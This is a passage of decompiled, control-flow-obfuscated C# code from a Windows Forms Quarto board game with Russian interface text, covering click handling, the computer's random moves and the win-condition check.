					continue;
				case 21u:
				{
					int num12;
					int num13;
					if (flag3)
					{
						num12 = 1914715741;
						num13 = 1914715741;
					}
					else
					{
						num12 = 1224029938;
						num13 = 1224029938;
					}
					num2 = num12 ^ ((int)num3 * -2133854615);
					continue;
				}
				case 20u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num2 = ((int)num3 * -1327344153) ^ -1273383128;
						continue;
					}
					goto IL_00d2;
				case 19u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num + 0.05f) * (float)size, ((float)num9 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num5, num4]), num * size + 4, num9 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num2 = ((int)num3 * -1754487883) ^ -1041274486;
					continue;
				case 18u:
					if (board[num9, num] == null)
					{
						num2 = 829977656;
						num8 = 829977656;
						continue;
					}
					goto IL_00d2;
				case 17u:
					Form1.smethod_45(graphics_);
					num2 = ((int)num3 * -1987225021) ^ 0x8131690;
					continue;
				case 16u:
				{
					int num10;
					int num11;
					if (!flag)
					{
						num10 = -23698611;
						num11 = -23698611;
					}
					else
					{
						num10 = -869127785;
						num11 = -869127785;
					}
					num2 = num10 ^ (int)(num3 * 465755351);
					continue;
				}
				case 15u:
					num2 = ((int)num3 * -1565853791) ^ 0xFDA3FBA;
					continue;
				case 14u:
					num9 = Form1.smethod_39(e) / size;
					num2 = ((int)num3 * -677267351) ^ -1277690742;
					continue;
				case 13u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num2 = (int)((num3 * 1328124406) ^ 0x1FAEF89B);
					continue;
				case 12u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num2 = ((int)num3 * -575938066) ^ 0x4350B6BB;
					continue;
				case 10u:
					num2 = ((int)num3 * -987389078) ^ -1055026716;
					continue;
				case 9u:
					flag3 = num5 < 4;
					num2 = 1596346555;
					continue;
				case 8u:
				{
					int num6;
					int num7;
					if (!flag2)
					{
						num6 = -1507621476;
						num7 = -1507621476;
					}
					else
					{
						num6 = -1629899360;
						num7 = -1629899360;
					}
					num2 = num6 ^ (int)(num3 * 444720679);
					continue;
				}
				case 7u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num2 = (int)(num3 * 906344014) ^ -677445501;
					continue;
				case 6u:
					num4 = 0;
					num2 = 1272795480;
					continue;
				case 5u:
					num2 = (int)((num3 * 1710768823) ^ 0x6093B3EF);
					continue;
				case 4u:
					num2 = ((int)num3 * -1047532652) ^ -206228210;
					continue;
				case 3u:
					flag2 = Form1.smethod_41((Control)(object)borderBox[num5, num4]) == Color.Blue;
					num2 = 1615545396;
					continue;
				case 2u:
					flag = num4 < 4;
					num2 = 622424170;
					continue;
				case 0u:
					Paint_Board();
					num2 = (int)((num3 * 1928379164) ^ 0x1E156C49);
					continue;
				default:
					return;
				case 11u:
					break;
				case 1u:
					return;
					IL_00d2:
					num2 = 498301527;
					num8 = 498301527;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_07c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_07f3: Expected O, but got Unknown
		int num42 = default(int);
		int num29 = default(int);
		int num19 = default(int);
		int num24 = default(int);
		int num31 = default(int);
		int num10 = default(int);
		int num4 = default(int);
		int num32 = default(int);
		int num11 = default(int);
		int num20 = default(int);
		bool flag11 = default(bool);
		int num3 = default(int);
		int num15 = default(int);
		int num16 = default(int);
		int num34 = default(int);
		int num33 = default(int);
		bool flag4 = default(bool);
		int num28 = default(int);
		bool flag17 = default(bool);
		Figurine[,] array2 = default(Figurine[,]);
		int num6 = default(int);
		int num43 = default(int);
		bool flag16 = default(bool);
		bool flag14 = default(bool);
		Figurine[,] array = default(Figurine[,]);
		bool flag10 = default(bool);
		bool flag = default(bool);
		bool flag3 = default(bool);
		bool flag5 = default(bool);
		int num17 = default(int);
		bool flag6 = default(bool);
		int num5 = default(int);
		bool flag15 = default(bool);
		Graphics graphics_ = default(Graphics);
		bool flag8 = default(bool);
		Figurine[,] array3 = default(Figurine[,]);
		int num7 = default(int);
		bool flag12 = default(bool);
		bool flag13 = default(bool);
		bool flag7 = default(bool);
		bool flag9 = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = -1154280193;
			while (true)
			{
				uint num2;
				int num45;
				int num30;
				int num23;
				int num18;
				switch ((num2 = (uint)num ^ 0xB33CE313u) % 178u)
				{
				case 177u:
					Form1.smethod_47(200);
					num = ((int)num2 * -231047299) ^ 0x2AC55FBC;
					continue;
				case 176u:
					Form1.smethod_30((Control)(object)borderBox[num42, num29]);
					num = (int)(num2 * 852292218) ^ -727777988;
					continue;
				case 175u:
					num19 = num24;
					num = (int)(num2 * 992178855) ^ -830992622;
					continue;
				case 174u:
					num45 = ((num31 < 9) ? 1 : 0);
					goto IL_0067;
				case 172u:
					num10++;
					num = (int)(num2 * 265725837) ^ -16413693;
					continue;
				case 171u:
					num24 = 0;
					num = (int)((num2 * 381572364) ^ 0x3A51FEFF);
					continue;
				case 170u:
					num = (int)(num2 * 2126967336) ^ -414078064;
					continue;
				case 169u:
					num4++;
					num = ((int)num2 * -1647619849) ^ -185816257;
					continue;
				case 168u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -809422455) ^ -1553898914;
					continue;
				case 167u:
					num32++;
					num = ((int)num2 * -1278585806) ^ 0x28D81B12;
					continue;
				case 166u:
					num19 = 0;
					num = (int)((num2 * 460720548) ^ 0x3198E3F0);
					continue;
				case 165u:
					Form1.smethod_47(1000);
					num = ((int)num2 * -2071466797) ^ -912986222;
					continue;
				case 164u:
					num = (int)((num2 * 80279424) ^ 0x51C1EF6D);
					continue;
				case 163u:
					num = (int)((num2 * 1279919449) ^ 0x13EC240E);
					continue;
				case 162u:
					Form1.smethod_7((Control)(object)pictureBox[num10, num11], bool_0: true);
					num = -179284980;
					continue;
				case 161u:
					num = ((int)num2 * -414585064) ^ 0x36176706;
					continue;
				case 160u:
					num = (int)((num2 * 169087730) ^ 0x5765D28D);
					continue;
				case 159u:
					Form1.smethod_5((Control)(object)borderBox[num42, num29], Color.Blue);
					num = ((int)num2 * -255838012) ^ -1565297613;
					continue;
				case 158u:
					storage[num19, num20] = null;
					num = ((int)num2 * -1954802259) ^ -755585426;
					continue;
				case 157u:
					num = (int)(num2 * 1523897347) ^ -673914075;
					continue;
				case 156u:
					num = (int)(num2 * 1513428930) ^ -1605386683;
					continue;
				case 155u:
					num = -207529873;
					continue;
				case 154u:
					num31++;
					flag11 = false;
					num = -43220353;
					continue;
				case 153u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					num = ((int)num2 * -701420132) ^ -999710580;
					continue;
				case 152u:
					num15 = 0;
					num16 = 0;
					num = ((int)num2 * -434324927) ^ -1476621699;
					continue;
				case 151u:
					Form1.smethod_30((Control)(object)borderBox[num3, num4]);
					num = (int)(num2 * 447556300) ^ -1941489318;
					continue;
				case 150u:
					Form1.smethod_30((Control)(object)borderBox[num19, num20]);
					num = (int)(num2 * 1766729698) ^ -1833915477;
					continue;
				case 149u:
					num = (int)((num2 * 1192421204) ^ 0x3D13B7A0);
					continue;
				case 148u:
					Form1.smethod_30((Control)(object)pictureBox[num19, num20]);
					board[num34, num33] = new Figurine(storage[num19, num20]);
					storage[num19, num20] = null;
					num = ((int)num2 * -1742257460) ^ 0x2BDF05EC;
					continue;
				case 147u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = ((int)num2 * -421671678) ^ -324934728;
					continue;
				case 146u:
					flag4 = num28 < 4;
					num = -1886918242;
					continue;
				case 145u:
					num = ((int)num2 * -1205158553) ^ -2118869800;
					continue;
				case 144u:
					num = (int)((num2 * 729293493) ^ 0x3494566C);
					continue;
				case 143u:
					num = ((int)num2 * -608957856) ^ 0x7D77C4EC;
					continue;
				case 142u:
				{
					int num56;
					int num57;
					if (flag17)
					{
						num56 = 1530029105;
						num57 = 1530029105;
					}
					else
					{
						num56 = 2081930886;
						num57 = 2081930886;
					}
					num = num56 ^ ((int)num2 * -1678693200);
					continue;
				}
				case 141u:
					array2[num6, num43] = new Figurine(storage[num42, num29]);
					num = ((int)num2 * -1667291277) ^ 0x7DFC858B;
					continue;
				case 140u:
					num15 = num3;
					num16 = num4;
					num = (int)(num2 * 392310102) ^ -1885859000;
					continue;
				case 139u:
					flag16 = num3 < 4;
					num = -356880947;
					continue;
				case 138u:
					num = ((int)num2 * -769107826) ^ 0x14617337;
					continue;
				case 137u:
				{
					int num50;
					int num51;
					if (flag14)
					{
						num50 = 1899383989;
						num51 = 1899383989;
					}
					else
					{
						num50 = 539248685;
						num51 = 539248685;
					}
					num = num50 ^ (int)(num2 * 1011891862);
					continue;
				}
				case 136u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = (int)((num2 * 1736603007) ^ 0x590CBDA);
					continue;
				case 135u:
					num42 = Form1.smethod_33(rnd, 4);
					num = -870671756;
					continue;
				case 134u:
					num32 = 0;
					num = (int)(num2 * 1217414090) ^ -2019025536;
					continue;
				case 133u:
					num11++;
					num = (int)((num2 * 1867752138) ^ 0x5CF58DD2);
					continue;
				case 132u:
				{
					int num44;
					if (array[num6, num43] == null)
					{
						num = -900491406;
						num44 = -900491406;
					}
					else
					{
						num = -1963613574;
						num44 = -1963613574;
					}
					continue;
				}
				case 131u:
					num = ((int)num2 * -966660339) ^ -1840790898;
					continue;
				case 130u:
					flag10 = num6 < 4;
					num = -670386836;
					continue;
				case 129u:
					(menu as Form3).ContinueLock();
					num = (int)(num2 * 249403491) ^ -795571912;
					continue;
				case 128u:
				{
					int num36;
					int num37;
					if (!flag)
					{
						num36 = -1471300240;
						num37 = -1471300240;
					}
					else
					{
						num36 = -1531123903;
						num37 = -1531123903;
					}
					num = num36 ^ (int)(num2 * 286882262);
					continue;
				}
				case 127u:
					num30 = ((num29 == num20) ? 1 : 0);
					goto IL_0590;
				case 126u:
					num20 = num28;
					num = ((int)num2 * -565359911) ^ -439257730;
					continue;
				case 125u:
					num31 = 0;
					num = ((int)num2 * -1767958027) ^ 0x3FF14F82;
					continue;
				case 124u:
					Form1.smethod_47(200);
					Form1.smethod_5((Control)(object)borderBox[num19, num20], Color.White);
					num = ((int)num2 * -1145367440) ^ 0x3C734BEF;
					continue;
				case 123u:
					num = (int)(num2 * 1009834681) ^ -97196480;
					continue;
				case 122u:
				{
					int num13;
					int num14;
					if (flag3)
					{
						num13 = -2039007810;
						num14 = -2039007810;
					}
					else
					{
						num13 = -1233619863;
						num14 = -1233619863;
					}
					num = num13 ^ (int)(num2 * 1835542059);
					continue;
				}
				case 121u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 1989846384) ^ 0x3C4EC232);
					continue;
				case 120u:
				{
					int num67;
					int num68;
					if (flag5)
					{
						num67 = -1820730246;
						num68 = -1820730246;
					}
					else
					{
						num67 = -291736651;
						num68 = -291736651;
					}
					num = num67 ^ ((int)num2 * -1142787339);
					continue;
				}
				case 119u:
					num17 = num4;
					num = ((int)num2 * -1118937196) ^ -24777724;
					continue;
				case 118u:
					num = (int)(num2 * 931926201) ^ -98611454;
					continue;
				case 117u:
					flag6 = num43 < 4;
					num = -414660177;
					continue;
				case 116u:
					num = ((int)num2 * -1513230489) ^ -1837296941;
					continue;
				case 115u:
					num = (int)(num2 * 689455074) ^ -1549018375;
					continue;
				case 114u:
					num3++;
					num = ((int)num2 * -412391243) ^ 0x133238BA;
					continue;
				case 113u:
					num = ((int)num2 * -610775424) ^ -1572141114;
					continue;
				case 112u:
					Form1.smethod_30((Control)(object)pictureBox[num3, num4]);
					num = ((int)num2 * -929315349) ^ 0x48291561;
					continue;
				case 111u:
					num = -1133218050;
					continue;
				case 110u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)((num2 * 141685641) ^ 0x2C4A661F);
					continue;
				case 109u:
					num = ((int)num2 * -1512684606) ^ 0x6C6C8AE8;
					continue;
				case 108u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = -2007868945;
					continue;
				case 107u:
					num43 = 0;
					num = -1676571606;
					continue;
				case 106u:
				{
					int num66;
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num4 * size + size / 2, (int)(((float)num3 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0))
					{
						num = -1277094460;
						num66 = -1277094460;
					}
					else
					{
						num = -1160396272;
						num66 = -1160396272;
					}
					continue;
				}
				case 105u:
					num11 = 0;
					num = -538430163;
					continue;
				case 104u:
				{
					int num65;
					if (board[num32, num5] != null)
					{
						num = -1759881356;
						num65 = -1759881356;
					}
					else
					{
						num = -441601168;
						num65 = -441601168;
					}
					continue;
				}
				case 103u:
					flag15 = Standoff(board);
					num = ((int)num2 * -393656122) ^ 0xA275A8C;
					continue;
				case 102u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num33 + 0.05f) * (float)size, ((float)num34 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -829739816) ^ -273683479;
					continue;
				case 101u:
					num = -764655794;
					continue;
				case 100u:
				{
					int num63;
					int num64;
					if (!flag16)
					{
						num63 = -638500969;
						num64 = -638500969;
					}
					else
					{
						num63 = -1878405541;
						num64 = -1878405541;
					}
					num = num63 ^ ((int)num2 * -12452302);
					continue;
				}
				case 99u:
					Form1.smethod_5((Control)(object)borderBox[num24, num28], Color.LimeGreen);
					num = ((int)num2 * -1898450896) ^ -333678244;
					continue;
				case 98u:
					num = (int)(num2 * 659674546) ^ -1358802800;
					continue;
				case 97u:
					num = (int)((num2 * 748146379) ^ 0x57EC45B0);
					continue;
				case 96u:
					num = ((int)num2 * -715239518) ^ 0x3C65A84C;
					continue;
				case 95u:
					Form1.smethod_20(pictureBox[num19, num20], (Image)null);
					num = ((int)num2 * -1130540309) ^ 0x10A4815D;
					continue;
				case 94u:
					num28 = 0;
					num = -1502270966;
					continue;
				case 93u:
					if (storage[num42, num29] != null)
					{
						num = ((int)num2 * -275260136) ^ -1523040137;
						continue;
					}
					num30 = 1;
					goto IL_0590;
				case 92u:
				{
					int num62;
					if (num10 >= 4)
					{
						num = -98761083;
						num62 = -98761083;
					}
					else
					{
						num = -171875680;
						num62 = -171875680;
					}
					continue;
				}
				case 91u:
				{
					int num60;
					int num61;
					if (flag10)
					{
						num60 = 506201702;
						num61 = 506201702;
					}
					else
					{
						num60 = 1067655085;
						num61 = 1067655085;
					}
					num = num60 ^ (int)(num2 * 681182146);
					continue;
				}
				case 90u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num5 + 0.05f) * (float)size, ((float)num32 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num19, num20]), num5 * size + 4, num32 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -284688116) ^ -915921926;
					continue;
				case 89u:
					flag8 = num11 < 4;
					num = -1698510076;
					continue;
				case 88u:
					Form1.smethod_7((Control)(object)pictureBox[num24, num28], bool_0: false);
					num = -628269644;
					continue;
				case 87u:
					num43++;
					num = -606038916;
					continue;
				case 86u:
				{
					int num58;
					int num59;
					if (board[num34, num33] == null)
					{
						num58 = -1014279298;
						num59 = -1014279298;
					}
					else
					{
						num58 = -1400145509;
						num59 = -1400145509;
					}
					num = num58 ^ (int)(num2 * 1178714865);
					continue;
				}
				case 85u:
					flag14 = Form1.smethod_41((Control)(object)borderBox[num3, num4]) == Color.Blue;
					num = -1526195252;
					continue;
				case 84u:
					Form1.smethod_15(timer1);
					num = -1161147339;
					continue;
				case 83u:
					array3 = (Figurine[,])Form1.smethod_48((Array)board);
					num = ((int)num2 * -1183660977) ^ 0x8C59770;
					continue;
				case 82u:
					board[num7, num17] = new Figurine(storage[num15, num16]);
					num = ((int)num2 * -1695163175) ^ 0x3B19E29;
					continue;
				case 81u:
					num = -1963613574;
					continue;
				case 80u:
					num = -835949204;
					continue;
				case 79u:
					num = ((int)num2 * -2117479341) ^ -1484661579;
					continue;
				case 78u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -854457721) ^ 0x605C81C0;
					continue;
				case 77u:
					flag12 = num32 < 4;
					num = -697400677;
					continue;
				case 76u:
					array3[num32, num5] = new Figurine(storage[num19, num20]);
					if (!Stop(array3))
					{
						num = (int)(num2 * 791137986) ^ -1623817901;
						continue;
					}
					num23 = 1;
					goto IL_0c7b;
				case 75u:
					Paint_Board();
					if (!Stop(board))
					{
						num = (int)(num2 * 1443157404) ^ -838568428;
						continue;
					}
					num18 = 0;
					goto IL_0caf;
				case 74u:
					num = ((int)num2 * -1192998202) ^ 0x5CFF1699;
					continue;
				case 72u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num = (int)(num2 * 84076371) ^ -1549057647;
					continue;
				case 71u:
					flag11 = true;
					num = (int)(num2 * 1245840460) ^ -1801041312;
					continue;
				case 70u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = (int)(num2 * 387563466) ^ -840257305;
					continue;
				case 69u:
					num20 = 0;
					num = (int)((num2 * 1811081303) ^ 0x1307762F);
					continue;
				case 68u:
					num10 = 0;
					num = ((int)num2 * -1124186876) ^ -269226915;
					continue;
				case 67u:
					flag13 = Form1.smethod_41((Control)(object)borderBox[num24, num28]) == Color.Red;
					num = (int)(num2 * 634144463) ^ -640335980;
					continue;
				case 66u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					array[num34, num33] = new Figurine(storage[num19, num20]);
					num = ((int)num2 * -1953241402) ^ 0x31A7130B;
					continue;
				case 65u:
					num = ((int)num2 * -2071320269) ^ 0x584FA21;
					continue;
				case 64u:
					num24++;
					num = ((int)num2 * -1053209793) ^ -519531233;
					continue;
				case 63u:
					num = ((int)num2 * -902706127) ^ 0x3E10459F;
					continue;
				case 62u:
					num5 = 0;
					num = -2073258914;
					continue;
				case 61u:
					num = ((int)num2 * -1745507362) ^ 0x5C84F70C;
					continue;
				case 60u:
					num = ((int)num2 * -572345672) ^ -1398318027;
					continue;
				case 59u:
					Form1.smethod_30((Control)(object)borderBox[num24, num28]);
					num = (int)((num2 * 333967103) ^ 0x33AEEB4A);
					continue;
				case 58u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -80521523) ^ 0x2863DDBB;
					continue;
				case 57u:
				{
					int num54;
					int num55;
					if (flag7)
					{
						num54 = 1352105536;
						num55 = 1352105536;
					}
					else
					{
						num54 = 490578302;
						num55 = 490578302;
					}
					num = num54 ^ ((int)num2 * -1727489146);
					continue;
				}
				case 56u:
					Form1.smethod_5((Control)(object)borderBox[num19, num20], Color.White);
					num = (int)((num2 * 900464255) ^ 0x7C9F06C3);
					continue;
				case 55u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -292973088) ^ -1219474206;
					continue;
				case 54u:
					num28++;
					num = ((int)num2 * -335199156) ^ -1879483897;
					continue;
				case 53u:
				{
					int num52;
					int num53;
					if (flag15)
					{
						num52 = -554021813;
						num53 = -554021813;
					}
					else
					{
						num52 = -573580453;
						num53 = -573580453;
					}
					num = num52 ^ (int)(num2 * 822432834);
					continue;
				}
				case 52u:
				{
					int num48;
					int num49;
					if (!flag13)
					{
						num48 = 345274866;
						num49 = 345274866;
					}
					else
					{
						num48 = 1401015546;
						num49 = 1401015546;
					}
					num = num48 ^ ((int)num2 * -1823553612);
					continue;
				}
				case 51u:
					num29 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -784271022) ^ 0x282AD0C8;
					continue;
				case 50u:
				{
					int num46;
					int num47;
					if (flag12)
					{
						num46 = 1636511715;
						num47 = 1636511715;
					}
					else
					{
						num46 = 1472961730;
						num47 = 1472961730;
					}
					num = num46 ^ (int)(num2 * 280104556);
					continue;
				}
				case 49u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -246258887) ^ -1561119416;
					continue;
				case 48u:
					if (!flag11)
					{
						num = ((int)num2 * -654157379) ^ -1851030507;
						continue;
					}
					num45 = 1;
					goto IL_0067;
				case 47u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = (int)((num2 * 1925319236) ^ 0x405443A2);
					continue;
				case 46u:
					if (num42 == num19)
					{
						num = (int)((num2 * 1516940584) ^ 0x19B64228);
						continue;
					}
					num30 = 0;
					goto IL_0590;
				case 45u:
				{
					int num40;
					int num41;
					if (!flag9)
					{
						num40 = -1168448087;
						num41 = -1168448087;
					}
					else
					{
						num40 = -877514186;
						num41 = -877514186;
					}
					num = num40 ^ (int)(num2 * 1483110719);
					continue;
				}
				case 44u:
					num34 = Form1.smethod_33(rnd, 4);
					num33 = Form1.smethod_33(rnd, 4);
					num = -1378791113;
					continue;
				case 43u:
				{
					int num38;
					int num39;
					if (!flag8)
					{
						num38 = -620031915;
						num39 = -620031915;
					}
					else
					{
						num38 = -535511805;
						num39 = -535511805;
					}
					num = num38 ^ ((int)num2 * -1257592176);
					continue;
				}
				case 42u:
					num6++;
					num = (int)(num2 * 538582271) ^ -1655675;
					continue;
				case 41u:
				{
					int num35;
					if (num4 >= 4)
					{
						num = -962636203;
						num35 = -962636203;
					}
					else
					{
						num = -1340516960;
						num35 = -1340516960;
					}
					continue;
				}
				case 40u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num19, num20]), num33 * size + 4, num34 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -179223849) ^ 0x6847902F;
					continue;
				case 39u:
					Form1.smethod_20(pictureBox[num19, num20], (Image)null);
					Form1.smethod_30((Control)(object)pictureBox[num19, num20]);
					board[num32, num5] = new Figurine(storage[num19, num20]);
					num = ((int)num2 * -1510771735) ^ -118569722;
					continue;
				case 38u:
					num4 = 0;
					num = -2113532284;
					continue;
				case 37u:
					flag7 = Stop(array2);
					num = ((int)num2 * -2140918546) ^ -516192126;
					continue;
				case 36u:
				{
					int num26;
					int num27;
					if (!flag6)
					{
						num26 = 1171514633;
						num27 = 1171514633;
					}
					else
					{
						num26 = 1333404707;
						num27 = 1333404707;
					}
					num = num26 ^ (int)(num2 * 1963833181);
					continue;
				}
				case 35u:
					num = (int)(num2 * 2113591005) ^ -1402652159;
					continue;
				case 34u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = -347836711;
					continue;
				case 33u:
					num = (int)((num2 * 1337121926) ^ 0x30079E4E);
					continue;
				case 32u:
				{
					int num25;
					if (num24 >= 4)
					{
						num = -943946214;
						num25 = -943946214;
					}
					else
					{
						num = -1968649189;
						num25 = -1968649189;
					}
					continue;
				}
				case 31u:
					Form1.smethod_30((Control)(object)label2);
					num = (int)((num2 * 595111146) ^ 0x70973D05);
					continue;
				case 30u:
					num23 = (Standoff(array3) ? 1 : 0);
					goto IL_0c7b;
				case 29u:
					flag5 = Form1.smethod_46((Control)(object)pictureBox1);
					num = (int)(num2 * 1762714259) ^ -1916307266;
					continue;
				case 28u:
					num = (int)(num2 * 1672651091) ^ -1771099288;
					continue;
				case 27u:
					num = (int)(num2 * 830318261) ^ -1995327936;
					continue;
				case 26u:
					num7 = 0;
					num = ((int)num2 * -944295686) ^ -60009289;
					continue;
				case 25u:
				{
					int num21;
					int num22;
					if (flag4)
					{
						num21 = -1678108785;
						num22 = -1678108785;
					}
					else
					{
						num21 = -1483082183;
						num22 = -1483082183;
					}
					num = num21 ^ (int)(num2 * 25266000);
					continue;
				}
				case 24u:
					num = ((int)num2 * -1817896095) ^ 0x3ACC12E2;
					continue;
				case 23u:
					array2 = (Figurine[,])Form1.smethod_48((Array)array);
					num = (int)((num2 * 1817074545) ^ 0x5429C77);
					continue;
				case 22u:
					Form1.smethod_30((Control)(object)borderBox[num19, num20]);
					num = ((int)num2 * -354403220) ^ 0x2864556C;
					continue;
				case 21u:
					num18 = ((!Standoff(board)) ? 1 : 0);
					goto IL_0caf;
				case 20u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = ((int)num2 * -294354113) ^ -486692893;
					continue;
				case 19u:
					num = (int)(num2 * 217986211) ^ -1863061193;
					continue;
				case 18u:
					num17 = 0;
					num3 = 0;
					num = ((int)num2 * -1918816197) ^ -1124655356;
					continue;
				case 17u:
					num5++;
					num = -1308204680;
					continue;
				case 16u:
					storage[num15, num16] = null;
					num = ((int)num2 * -459688484) ^ -1932384164;
					continue;
				case 15u:
				{
					int num12;
					if (Standoff(board))
					{
						num = -1683780149;
						num12 = -1683780149;
					}
					else
					{
						num = -1553585167;
						num12 = -1553585167;
					}
					continue;
				}
				case 14u:
					Form1.smethod_15(timer1);
					num = ((int)num2 * -1437823366) ^ 0x70C5C05D;
					continue;
				case 13u:
				{
					int num8;
					int num9;
					if (flag2)
					{
						num8 = -661051067;
						num9 = -661051067;
					}
					else
					{
						num8 = -1341297893;
						num9 = -1341297893;
					}
					num = num8 ^ (int)(num2 * 568913562);
					continue;
				}
				case 12u:
					num7 = num3;
					num = ((int)num2 * -1579662513) ^ 0x4BE66E58;
					continue;
				case 11u:
					num = -1759881356;
					continue;
				case 10u:
					num = ((int)num2 * -2121137207) ^ 0x13A25A2A;
					continue;
				case 9u:
					num = (int)((num2 * 347941157) ^ 0x370FBCCF);
					continue;
				case 8u:
					num6 = 0;
					num = ((int)num2 * -1910138606) ^ -192412361;
					continue;
				case 7u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = ((int)num2 * -169045176) ^ 0x5464132A;
					continue;
				case 6u:
					num = (int)(num2 * 1975228496) ^ -1363488660;
					continue;
				case 5u:
					num = ((int)num2 * -462673480) ^ 0xF47D69E;
					continue;
				case 4u:
					num = (int)(num2 * 180572325) ^ -1482832910;
					continue;
				case 3u:
					flag = num5 < 4;
					num = -406660559;
					continue;
				case 2u:
					num = ((int)num2 * -666996708) ^ 0x245AEF33;
					continue;
				case 1u:
					Form1.smethod_20(pictureBox[num3, num4], (Image)null);
					num = ((int)num2 * -1276631112) ^ 0xC32D915;
					continue;
				case 0u:
					num = (int)((num2 * 882843463) ^ 0x7376C2F9);
					continue;
				default:
					return;
				case 173u:
					break;
				case 73u:
					return;
					IL_0590:
					flag3 = (byte)num30 != 0;
					num = -515839361;
					continue;
					IL_0067:
					flag2 = (byte)num45 != 0;
					num = -1149945082;
					continue;
					IL_0caf:
					flag9 = (byte)num18 != 0;
					num = -1087418150;
					continue;
					IL_0c7b:
					flag17 = (byte)num23 != 0;
					num = -49523653;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		int num3 = default(int);
		bool flag = default(bool);
		bool result = default(bool);
		bool flag3 = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = -1449988793;
			while (true)
			{
				uint num2;
				int num30;
				int num18;
				switch ((num2 = (uint)num ^ 0x947678ABu) % 77u)
				{
				case 76u:
				{
					int num52;
					if (mem[num3, 0] == null)
					{
						num = -2001090801;
						num52 = -2001090801;
					}
					else
					{
						num = -1155200437;
						num52 = -1155200437;
					}
					continue;
				}
				case 75u:
				{
					int num39;
					if (mem[0, 3].Dark == mem[1, 2].Dark)
					{
						num = -1107042582;
						num39 = -1107042582;
					}
					else
					{
						num = -2131495875;
						num39 = -2131495875;
					}
					continue;
				}
				case 74u:
				{
					int num19;
					int num20;
					if (mem[num3, 1] == null)
					{
						num19 = 1317509327;
						num20 = 1317509327;
					}
					else
					{
						num19 = 2042574968;
						num20 = 2042574968;
					}
					num = num19 ^ (int)(num2 * 539286706);
					continue;
				}
				case 73u:
				{
					int num8;
					int num9;
					if (mem[2, 2] == null)
					{
						num8 = -330009348;
						num9 = -330009348;
					}
					else
					{
						num8 = -1483674818;
						num9 = -1483674818;
					}
					num = num8 ^ (int)(num2 * 1012679933);
					continue;
				}
				case 72u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = (int)(num2 * 159549522) ^ -1921184199;
						continue;
					}
					goto IL_00f1;
				case 71u:
					if (mem[2, num3].Big != mem[3, num3].Big)
					{
						num = ((int)num2 * -745092411) ^ -1229438891;
						continue;
					}
					goto IL_0130;
				case 70u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = (int)((num2 * 1891581038) ^ 0x15A20BC9);
						continue;
					}
					goto IL_017b;
				case 69u:
					if (mem[0, num3].Square == mem[1, num3].Square)
					{
						num = -1336564124;
						continue;
					}
					goto IL_013c;
				case 68u:
				{
					int num56;
					int num57;
					if (mem[num3, 3] != null)
					{
						num56 = -894703704;
						num57 = -894703704;
					}
					else
					{
						num56 = -864980299;
						num57 = -864980299;
					}
					num = num56 ^ ((int)num2 * -1759723202);
					continue;
				}
				case 67u:
				{
					int num49;
					if (mem[num3, 0].Dark != mem[num3, 1].Dark)
					{
						num = -1491890410;
						num49 = -1491890410;
					}
					else
					{
						num = -1954723904;
						num49 = -1954723904;
					}
					continue;
				}
				case 66u:
					if (mem[num3, 2].Big != mem[num3, 3].Big)
					{
